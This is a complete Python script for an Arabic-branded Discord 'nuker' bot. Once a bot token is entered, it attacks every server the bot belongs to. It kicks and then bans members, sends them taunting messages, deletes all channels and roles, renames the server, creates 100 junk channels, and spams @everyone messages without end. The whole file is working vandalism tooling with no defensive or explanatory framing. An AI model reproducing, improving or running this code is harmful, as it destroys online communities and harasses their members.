import discord
from discord.ext import commands
import asyncio
import os
import random
from colorama import init, Fore, Style
import time

init(autoreset=True)

# تنظيف الشاشة
os.system('cls' if os.name == 'nt' else 'clear')

# واجهة البداية
print(Fore.RED + """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║         ██╗  ██╗ █████╗ ██████╗                             ║
║         ██║  ██║██╔══██╗██╔══██╗                            ║
║         ███████║███████║██████╔╝                            ║
║         ██╔══██║██╔══██║██╔══██╗                            ║
║         ██║  ██║██║  ██║██║  ██║                            ║
║         ╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝                            ║
║                                                              ║
║          الكتيبة هاق مشا تيم - NUKER ULTIMATE               ║
║                                                              ║
║              [ VON KATIBA JAK LMOT RA7 TARJ3 LOT ]         ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)

# طلب التوكن
token = input(Fore.YELLOW + "[?] ادخل توكن البوت: " + Fore.CYAN)
print(Fore.GREEN + "\n[✓] جاري الاتصال بديسكورد..." + Style.RESET_ALL)

# إعدادات البوت
intents = discord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)

# رسالة الطرد
KICK_MESSAGE = """
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║              VON KATIBA JAK LMOT RA7 TARJ3 LOT              ║
║                                                              ║
║                    HHHH HHHH HHHH HHHH                      ║
║                                                              ║
║              ████████╗███████╗ █████╗ ███╗   ███╗           ║
║              ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║           ║
║                 ██║   █████╗  ███████║██╔████╔██║           ║
║                 ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║           ║
║                 ██║   ███████╗██║  ██║██║ ╚═╝ ██║           ║
║                 ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝           ║
║                                                              ║
║              الكتيبة هاق مشا تيم تخلص عليكم                 ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
"""

# قائمة رسائل السبام
spam_messages = [
    "@everyone **VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "```الكتيبة هاق مشا تيم```",
    "@everyone **تم اختراق السيرفر بالكامل**",
    "```SERVER DESTROYED BY HAQ MASHA TEAM```",
    "**VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH**",
    "@everyone **راجعوا حساباتكم محد رح يساعدكم**",
    "```BYE BYE SERVER```",
    "**😂😂😂😂😂 يا خسارة فيكم**"
]

# أسماء الرتب الجديدة
rank_names = ["VON", "KATIBA", "JAK", "LMOT", "RA7", "TARJ3", "LOT", "HHHH", "HAQ", "MASHA", "TEAM", "NUKER"]

@bot.event
async def on_ready():
    print(Fore.GREEN + f"\n[✓] تم تشغيل البوت: {bot.user.name}#{bot.user.discriminator}")
    print(Fore.YELLOW + f"[✓] معرف البوت: {bot.user.id}")
    print(Fore.RED + "\n[⚠] سيبدأ النوكر بعد 3 ثواني...\n" + Style.RESET_ALL)
    
    await asyncio.sleep(3)
    
    # تخريب جميع السيرفرات التي فيها البوت
    for guild in bot.guilds:
        print(Fore.MAGENTA + f"\n{'='*60}")
        print(f"[*] جاري تخريب السيرفر: {guild.name} ({guild.id})")
        print(f"{'='*60}" + Style.RESET_ALL)
        
        # ============================================
        # المرحلة 1: طرد جميع الأعضاء بسرعة فائقة
        # ============================================
        print(Fore.RED + "\n[!!!] المرحلة 1: بدء طرد جميع الأعضاء بسرعة فائقة..." + Style.RESET_ALL)
        
        members = await guild.fetch_members(limit=None).flatten()
        total_members = len([m for m in members if not m.bot and m.id != guild.owner_id])
        kicked_count = 0
        
        start_time = time.time()
        
        # طرد جميع الأعضاء (ما عدا البوت والأونور)
        for member in members:
            if not member.bot and member.id != guild.owner_id:
                try:
                    # إرسال رسالة خاصة للعضو قبل الطرد
                    try:
                        await member.send(KICK_MESSAGE)
                    except:
                        pass
                    
                    # طرد العضو
                    await member.kick(reason="VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH")
                    kicked_count += 1
                    
                    # عرض التقدم كل 5 أعضاء
                    if kicked_count % 5 == 0:
                        print(Fore.CYAN + f"    [✓] تم طرد {kicked_count}/{total_members} عضو" + Style.RESET_ALL)
                    
                    # تأخير بسيط جداً لتجنب الـ Rate Limit
                    await asyncio.sleep(0.1)
                    
                except Exception as e:
                    print(Fore.RED + f"    [✗] فشل طرد {member.name}: {str(e)[:50]}" + Style.RESET_ALL)
        
        end_time = time.time()
        time_taken = round(end_time - start_time, 2)
        
        print(Fore.GREEN + f"\n[✓] اكتمل طرد الأعضاء: تم طرد {kicked_count} عضو خلال {time_taken} ثانية" + Style.RESET_ALL)
        
        # ============================================
        # المرحلة 2: إرسال رسائل السبام للأعضاء المتبقين
        # ============================================
        print(Fore.YELLOW + "\n[!!!] المرحلة 2: بدء إرسال رسائل السبام..." + Style.RESET_ALL)
        
        # إرسال رسالة للقناة النظامية إن وجدت
        for channel in guild.text_channels:
            try:
                await channel.send(KICK_MESSAGE)
                await channel.send("@everyone **" + KICK_MESSAGE[:100] + "**")
            except:
                pass
        
        # ============================================
        # المرحلة 3: التخريب الكامل للسيرفر
        # ============================================
        print(Fore.RED + "\n[!!!] المرحلة 3: بدء التخريب الكامل للسيرفر..." + Style.RESET_ALL)
        
        # 1. تغيير اسم السيرفر
        try:
            await guild.edit(name="VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH")
            print(Fore.GREEN + "[✓] تم تغيير اسم السيرفر" + Style.RESET_ALL)
        except:
            print(Fore.RED + "[✗] فشل تغيير اسم السيرفر" + Style.RESET_ALL)
        
        # 2. حذف جميع الرومات بسرعة
        print(Fore.YELLOW + "[*] جاري حذف جميع الرومات..." + Style.RESET_ALL)
        for channel in guild.channels:
            try:
                await channel.delete(reason="NUKER")
                print(Fore.CYAN + f"    [✓] تم حذف: {channel.name}" + Style.RESET_ALL)
                await asyncio.sleep(0.05)
            except:
                pass
        
        # 3. حذف جميع الرتب
        print(Fore.YELLOW + "[*] جاري حذف جميع الرتب..." + Style.RESET_ALL)
        for role in guild.roles:
            if role.name != "@everyone":
                try:
                    await role.delete(reason="NUKER")
                    print(Fore.CYAN + f"    [✓] تم حذف رتبة: {role.name}" + Style.RESET_ALL)
                    await asyncio.sleep(0.05)
                except:
                    pass
        
        # 4. إنشاء 100 روم جديد بسرعة
        print(Fore.YELLOW + "[*] جاري إنشاء 100 روم جديد..." + Style.RESET_ALL)
        for i in range(100):
            try:
                await guild.create_text_channel(name=f"VON-KATIBA-{i}")
                if i % 20 == 0:
                    print(Fore.CYAN + f"    [✓] تم إنشاء {i} روم..." + Style.RESET_ALL)
                await asyncio.sleep(0.05)
            except:
                pass
        
        # 5. إنشاء رتب جديدة
        print(Fore.YELLOW + "[*] جاري إنشاء رتب جديدة..." + Style.RESET_ALL)
        for rank in rank_names:
            try:
                await guild.create_role(name=rank, color=discord.Color.red())
                print(Fore.CYAN + f"    [✓] تم إنشاء رتبة: {rank}" + Style.RESET_ALL)
                await asyncio.sleep(0.05)
            except:
                pass
        
        # 6. حظر الأعضاء المتبقين
        print(Fore.YELLOW + "[*] جاري حظر الأعضاء المتبقين..." + Style.RESET_ALL)
        remaining_members = await guild.fetch_members(limit=None).flatten()
        for member in remaining_members:
            if not member.bot:
                try:
                    await member.ban(reason="VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH")
                except:
                    pass
        
        # 7. بدء السبام المستمر في جميع الرومات الجديدة
        print(Fore.YELLOW + "[*] بدء إرسال السبام المستمر..." + Style.RESET_ALL)
        
        async def spam_all_channels():
            while True:
                for channel in guild.text_channels:
                    try:
                        msg = random.choice(spam_messages)
                        await channel.send(msg)
                        await asyncio.sleep(0.1)
                    except:
                        pass
                await asyncio.sleep(0.5)
        
        # تشغيل السبام في الخلفية
        asyncio.create_task(spam_all_channels())
        
        print(Fore.GREEN + f"""
╔══════════════════════════════════════════════════════════════╗
║                                                              ║
║   ✓✓✓ اكتمل التخريب بنجاح ✓✓✓                              ║
║                                                              ║
║   - تم طرد {kicked_count} عضو                              ║
║   - تم حذف جميع الرومات والرتب                              ║
║   - تم إنشاء 100 روم جديد                                   ║
║   - بدأ السبام المستمر                                      ║
║                                                              ║
║   VON KATIBA JAK LMOT RA7 TARJ3 LOT HHHH                   ║
║                                                              ║
║   الكتيبة هاق مشا تيم                                       ║
║                                                              ║
╚══════════════════════════════════════════════════════════════╝
""" + Style.RESET_ALL)
        
        # استمرار البوت للتخريب
        await asyncio.sleep(3600)  # البوت يبقى شغال ساعة كاملة

# تشغيل البوت
bot.run(token)
